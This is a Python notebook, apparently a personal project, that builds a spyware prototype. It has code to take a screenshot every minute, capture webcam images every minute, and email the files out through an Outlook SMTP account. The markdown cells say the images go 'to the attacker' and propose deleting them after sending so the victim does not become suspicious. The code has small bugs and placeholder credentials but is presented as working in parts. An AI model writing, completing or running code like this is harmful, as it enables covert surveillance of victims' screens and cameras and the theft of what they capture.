{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMflJ6gkHo6zCWNA+b3aNds",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ahmedabdurahim/Cyber-marketing-sales/blob/main/CyberWarfareCode.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Install all libraries that don't yet exist"
      ],
      "metadata": {
        "id": "dEHZqMIaIaMg"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "31bFfRPqaTKO"
      },
      "outputs": [],
      "source": [
        "! pip install pyautogui\n",
        "! pip install redmail"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "The cell below takes a screenshot every minute and saves it to a folder"
      ],
      "metadata": {
        "id": "KLHRzqxgIgEB"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "import pyautogui\n",
        "from time import sleep\n",
        "\n",
        "os.environ['DISPLAY'] = ':0'\n",
        "\n",
        "def screenCapture():\n",
        "  screenshot = pyautogui.screenshot()\n",
        "  screenshot.save(\"C:\\Users\\user\\Pictures\\_pic.png\")\n",
        "\n",
        "while True:\n",
        "  screenCapture();\n",
        "  sleep(60)"
      ],
      "metadata": {
        "id": "_g4xzpeibrw9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The idea here is to take a picture with the webcam every minute and save it to a folder to then later be sent to the attacker via email. We could also add a cell that deletes all screenshots and images taken by this program right after the files are sent so minimise the victim being sus"
      ],
      "metadata": {
        "id": "bsAC5MD1IrBK"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import cv2\n",
        "from time import sleep\n",
        "\n",
        "camera = cv2.VideoCapture(0)\n",
        "while True:\n",
        "    return_value, image = camera.read()\n",
        "    cv2.imwrite('webcam.png', image)\n",
        "    sleep(60)\n",
        "del(camera)"
      ],
      "metadata": {
        "id": "w2ry6Vz3AWVT"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "With the cell below we are sending our captured screenshots to the desired destination through smtp aka redmail aka email "
      ],
      "metadata": {
        "id": "gufm6yqlJNBl"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from redmail import outlook\n",
        "from time import sleep\n",
        "\n",
        "while True:\n",
        "  outlook.username = \"email\"\n",
        "  outlook.password = \"password\"\n",
        "\n",
        "  outlook.send(\n",
        "      receivers = \"\"\"destination email\"\"\",\n",
        "      subject = '''subject''',\n",
        "      text= '''Text if you wish''',\n",
        "      attachment = '''dir to the attachments'''\n",
        "      )\n",
        "  print('sent ' + str(i))\n",
        "  sleep(60)"
      ],
      "metadata": {
        "id": "RNyds-jvGx84"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "This does not fully or seamlessly work as its only a prototype the cells will work independently though"
      ],
      "metadata": {
        "id": "bm0SqmJXJb12"
      }
    }
  ]
}